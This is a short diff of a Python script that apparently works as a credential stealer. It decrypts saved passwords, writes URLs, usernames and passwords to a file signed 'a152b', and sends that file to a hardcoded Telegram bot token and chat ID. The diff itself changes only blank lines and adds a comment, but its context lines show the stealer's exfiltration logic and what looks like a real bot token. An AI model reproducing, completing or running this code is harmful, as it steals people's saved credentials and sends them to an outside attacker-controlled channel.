@@ -11,7 +11,6 @@ import asyncio
 
 TELEGRAM_BOT_TOKEN = '7558492008:AAE1ZrjixCRDGxRQaRhmkvXpJpADeIgX2gw'
 CHAT_ID = '874924103'
-
 async def send_passwords_to_telegram(file_path):
     bot = Bot(token=TELEGRAM_BOT_TOKEN)
     
@@ -69,7 +68,6 @@ def decrypt_password(ciphertext):
 
 def save_passwords_to_file(passwords, file_path):
     with open(file_path, 'w', encoding='utf-8') as file:
-
         file.write("All work done by a152b\n\n")
         for url, username, password in passwords:
             file.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")
@@ -82,3 +80,5 @@ if __name__ == "__main__":
         asyncio.run(send_passwords_to_telegram(file_path))
     else:
         print("Пароли не найдены.")
+
+#A152b
